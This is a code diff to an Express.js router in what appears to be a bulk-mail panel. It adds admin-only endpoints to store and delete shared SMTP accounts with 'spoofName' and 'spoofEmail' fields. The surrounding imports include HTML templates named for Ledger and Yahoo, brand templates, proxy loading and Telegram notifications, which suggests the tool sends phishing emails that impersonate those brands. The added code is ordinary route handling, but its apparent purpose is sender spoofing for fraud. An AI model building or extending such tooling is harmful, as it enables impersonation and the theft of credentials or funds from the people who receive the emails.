@@ -12,7 +12,8 @@ const {
 } = require('../storage');
 const {
   getSharedSmtpConfigs, getUserSenderConfig, getEffectiveSmtpConfig,
-  createTransporter, loadProxies, attachSenderImage
+  createTransporter, loadProxies, attachSenderImage,
+  addSharedSmtpConfig, deleteSharedSmtpConfig
 } = require('../smtp');
 const { buildLedgerHTML, buildYahooHTML, BRAND_TEMPLATES, getBrandTemplates, addCustomBrandTemplates } = require('../templates');
 const { sendTelegramNotification } = require('../telegram');
@@ -241,6 +242,33 @@ router.post('/smtp-test', requireAuth, async (req, res) => {
     res.json({ success: true, message: 'SMTP connection successful!' });
   } catch (err) {
     res.json({ success: false, message: err.message });
+  }
+});
+
+// ============ API: SHARED SMTP CONFIGS (admin-only, available to all users) ============
+router.post('/shared-smtp', requireAuth, requireAdmin, async (req, res) => {
+  try {
+    const { id, name, host, port, secure, user, pass, domain, spoofName, spoofEmail } = req.body;
+    if (!name || !host || !user || !domain) {
+      return res.status(400).json({ success: false, message: 'Name, host, user, and domain are required' });
+    }
+    const config = await addSharedSmtpConfig({
+      id, name, host, port: port || 587, secure: secure || false,
+      user, pass: pass || '', domain,
+      spoofName: spoofName || '', spoofEmail: spoofEmail || ''
+    });
+    res.json({ success: true, config: { ...config, pass: '********' } });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+router.delete('/shared-smtp/:id', requireAuth, requireAdmin, async (req, res) => {
+  try {
+    await deleteSharedSmtpConfig(req.params.id);
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
   }
 });
 
